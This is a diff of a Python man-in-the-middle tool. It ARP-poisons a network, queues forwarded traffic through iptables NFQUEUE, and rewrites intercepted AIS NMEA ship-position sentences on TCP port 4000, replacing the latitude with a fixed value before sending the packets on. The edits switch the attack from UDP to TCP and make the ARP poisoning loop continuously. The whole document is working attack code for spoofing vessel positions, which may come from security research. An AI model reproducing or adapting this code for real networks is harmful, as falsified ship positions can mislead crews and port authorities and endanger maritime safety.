@@ -28,50 +28,50 @@ class MITM:
         self.target_mac = None
         self.nfqueue = NetfilterQueue()
         self.pkt = None
-        
 
     #def payload_handle(self):
 
     def modify(self, packet):
-        self.arp_poison()
         pkt = packet.get_payload()
 
         pktIP = IP(pkt)
         
         #pktIP.show()
-        payload = pktIP.getlayer(UDP).payload
-        if pktIP.haslayer(UDP) and pktIP.src == self.src_ip:
-            print(f"[*] Packet Intercepted with payload {payload}")
-            fragment = str(pktIP[UDP].payload).split(",")[1]
-            #print(fragment, type(fragment))
-            if int(fragment) != 2:
-                
-                ais_data = AIS_NMEA(bytes(payload))
+        #payload = pktIP.getlayer(TCP).payload
+        try:
+            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and str(pktIP[TCP].payload).startswith("!A"):
+            
+                    
+                print(f"[*] Packet Intercepted with payload {pktIP[TCP].payload}")
+                ais_data = AIS_NMEA(bytes(pktIP[TCP].payload))
 
-                # print(f"[*] Decoded: {ais_data.decoded_dict}")
-                old_len = len(pktIP[UDP].payload)
-                pktIP[UDP].remove_payload()
+                #print(f"[*] Decoded: {ais_data.decoded_dict}")
+                old_len = len(pktIP[TCP].payload)
+                pktIP[TCP].remove_payload()
 
                 ais_data.alter_field('lat', 48.475577)
-                pktIP[UDP].add_payload(ais_data.modified_sentence[0])
-
-                new_len = len(pktIP[UDP].payload)
+                pktIP[TCP].add_payload(ais_data.modified_sentence[0])
+                print(f"\n packet modified..{pktIP[TCP].payload}")
+                new_len = len(pktIP[TCP].payload)
                 pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                 del pktIP[IP].chksum
-                del pktIP[UDP].chksum
-                del pktIP[UDP].len
+                del pktIP[TCP].chksum
+                #del pktIP[TCP].len
                 #pktIP.show2()
                 pkt = pktIP.__class__(bytes(pktIP))
                 packet.set_payload(bytes(pkt))
+        except Exception as e:
+            print(e)
+           
 
         packet.accept()
 
     def setup(self):
-        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip} > /dev/null 2>&1"
-        ip_forward = "sudo sysctl net.ipv4.ip_forward=1 /dev/null 2>&1"
-        os.system(iptable_config)
-        os.system(ip_forward)
-        self.nfqueue.bind(0, self.modify)
+        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
+        ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
+        #os.system(iptable_config)
+        #os.system(ip_forward)
+        #self.nfqueue.bind(0, self.modify)
 
     def get_mac(self, ip):
         try:
@@ -120,9 +120,9 @@ class MITM:
             print(f"[*] Getting MAC address of {self.src_ip}: {self.src_mac}")
             print(
                 f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
-
-            self.arp_poison()
-            time.sleep(1.5)
+            while True:
+                self.arp_poison()
+                time.sleep(1.5)
 
         except Exception as e:
             print("[!] MITM failed..")
@@ -164,6 +164,7 @@ if __name__ == '__main__':
     try:
         print("[*] waiting for data")
         mitm.nfqueue.run()
+        mitm.start_mitm()
     except KeyboardInterrupt:
         mitm.stop_mitm()
 
